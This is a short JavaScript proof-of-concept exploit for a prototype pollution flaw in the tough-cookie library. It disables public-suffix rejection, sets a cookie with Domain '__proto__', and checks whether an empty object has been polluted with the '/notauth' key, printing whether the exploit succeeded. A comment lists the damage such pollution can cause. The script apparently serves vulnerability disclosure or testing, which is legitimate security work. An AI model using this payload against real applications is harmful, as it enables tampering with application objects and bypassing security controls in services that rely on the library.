async function main() {
    var tough = require('../tough-cookie/lib/cookie');
    const cookiejar = new tough.CookieJar(undefined, {
        rejectPublicSuffixes: false // Disable rejection of public suffixes, potentially allowing dangerous cookies
    });

    // Attempt to exploit the prototype pollution vulnerability by setting a cookie with a domain of '__proto__'
    cookiejar.setCookieSync(
        "Slonser=polluted; Domain=__proto__; Path=/notauth",
        "https://__proto__/admin"
    );
    
    // // Normal cookie
    // cookiejar.setCookieSync(
    //   "Auth=Lol; Domain=google.com; Path=/notauth",
    //   "https://google.com/"
    // );
  
    // Check for exploitation - if prototype pollution occurred, the prototype of `pollutedObject` could have been altered
    // The path '/notauth' might have been added to the prototype, and this is what I check
    var pollutedObject = {};
    if (pollutedObject["/notauth"] === undefined) {
      console.log("EXPLOIT FAILED"); // Prototype pollution did not occur
    } else {
      console.log("EXPLOITED SUCCESSFULLY"); // Prototype pollution occurred
    }
  }
  
  main().catch(console.error);

  /* The potential damage:
        * If the attack works, it can change how objects in the application behave, causing bugs / unexpected behavior.
        * Attackers could use this vulnerability to bypass security measures and get access to sensitive information.
  */